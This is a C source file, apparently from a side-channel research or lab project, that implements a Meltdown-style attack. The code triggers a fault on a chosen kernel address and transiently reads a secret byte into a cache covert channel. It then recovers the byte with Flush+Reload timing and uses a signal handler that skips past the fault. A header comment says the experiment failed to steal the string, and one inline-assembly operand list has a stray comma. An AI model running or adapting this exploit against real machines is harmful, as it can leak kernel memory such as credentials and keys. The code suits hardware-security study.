/*
 * 先故意触发一次内核地址段错，在瞬态期间去指定内核地址偷数据
 *
 * 实验结果：无法窃取到字符串
 */

#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <signal.h>
#include <sys/ucontext.h>
#include <unistd.h>
#include <fcntl.h>
#include <ctype.h>
#include <sched.h>
#include <x86intrin.h>
#include "../utils/cache_instr.h"

#define GAP 4096

uint8_t channel[256 * GAP];
int cache_hit_threshold = 400;

void flush_cache()
{
    for (int i = 0; i < 256; i++)
    {
        flush(&channel[i * GAP]);
    }
}

extern char stopspeculate[];

static void __attribute__((noinline)) victim(unsigned long secret_addr)
{
    __asm__ volatile(
        "1:\n\t"
        /* 放大投机窗口 */
        ".rept 300\n\t"
        "add $0x141, %%rax\n\t"
        ".endr\n\t"

        /* 访问内核地址（故意触发异常），会导致段错误（SIGSEGV） */

        /* 异常架构化前的瞬态执行，访问内核态 secret 地址并编码 */
        "movzbl (%[saddr]), %%eax\n\t"
        "shl $12, %%rax\n\t"
        "movb (%[target], %%rax, 1), %%al\n\t"

        /* 跳转到信号处理器的安全点 */
        ".globl stopspeculate\n\t"
        "stopspeculate:\n\t"
        "nop\n\t"
        :
        : [target] "r"(channel),
          [saddr] "r"(secret_addr),
        : "rax", "cc", "memory");
}

static int results[256];
void cache_detect()
{
    int i, mix_i;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    for (i = 0; i < 256; i++)
    {
        mix_i = ((i * 167) + 13) & 255;
        addr = &channel[mix_i * GAP];

        time1 = rdtscp();
        maccess(addr);
        time2 = rdtscp();

        if ((int)(time2 - time1) <= cache_hit_threshold)
            results[mix_i]++;
    }
}

void sigsegv(int sig, siginfo_t *siginfo, void *context)
{
    ucontext_t *ucontext = context;
    /* set RIP to the address of our stopspeculate function */
    ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
    return;
}

int set_signal(void)
{
    struct sigaction act = {
        .sa_sigaction = sigsegv,
        .sa_flags = SA_SIGINFO,
    };

    return sigaction(SIGSEGV, &act, NULL);
}

int ReadOneByte(unsigned long addr)
{
    int i, ret = 0, max = -1, maxi = -1;
    static char buf[256];

    memset(results, 0, sizeof(results));

    for (i = 0; i < 1000; i++)
    {
        flush_cache();

        mfence();

        victim(addr);

        mfence();

        cache_detect();
    }
    for (i = 0; i < 256; i++)
    {
        if (results[i] && results[i] > max)
        {
            max = results[i];
            maxi = i;
        }
    }
    return maxi;
}

int main(int argc, char *argv[])
{
    int ret, i;
    unsigned long addr = 0, size = 0;

    if (argc == 3 || argc == 4)
    {
        // 解析地址和大小
        sscanf(argv[1], "%lx", &addr);
        sscanf(argv[2], "%lx", &size);

        // 如果有第三个参数，解析 cache_hit_threshold
        if (argc == 4)
        {
            sscanf(argv[3], "%d", &cache_hit_threshold);
        }
    }
    else
    {
        fprintf(stderr, "Usage: %s <hex_addr> <length> [cache_hit_threshold]\n", argv[0]);
        return 1;
    }

    memset(channel, 1, sizeof(channel));

    ret = set_signal();
    if (ret != 0)
    {
        perror("set_signal");
        return 1;
    }

    for (i = 0; i < size; i++)
    {
        ret = ReadOneByte(addr);
        if (ret == -1)
            ret = 0xff;
        printf("read %lx = %x %c (score=%d/%d)\n",
               addr, ret, isprint(ret) ? ret : ' ',
               ret != 0xff ? results[ret] : 0,
               1000);
        addr++;
    }

    return 0;
}
